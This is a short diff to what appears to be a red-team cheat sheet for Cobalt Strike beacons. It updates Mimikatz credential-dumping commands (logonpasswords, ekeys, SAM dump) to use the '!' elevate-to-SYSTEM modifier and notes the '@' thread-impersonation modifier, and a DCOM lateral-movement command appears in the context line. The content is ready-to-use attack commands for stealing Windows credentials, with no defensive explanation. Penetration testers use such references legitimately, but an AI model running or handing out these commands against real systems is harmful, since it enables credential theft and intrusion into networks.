@@ -303,19 +303,23 @@ powershell Invoke-DCOM -ComputerName <HOSTNAME> -Method MMC20.Application -Comma
 ```
 
 ### Credentials
+- The `!`(Elevate to system) and `@`(Impersonate beacons thread) symbols are modifiers.
+- Go to View -> Credentials to see a copy of all the credentials
+
 #### Mimikatz logonpasswords
 ```
-mimikatz sekurlsa::logonpasswords
+mimikatz !sekurlsa::logonpasswords
+logonpasswords
 ```
 
 #### Mimikatz ekeys
 ```
-mimikatz sekurlsa::ekeys
+mimikatz !sekurlsa::ekeys
 ```
 
 #### Mimikatz sam
 ```
-mimikatz lsadump::sam
+mimikatz !lsadump::sam
 ```
 
 #### Make token - runas other user
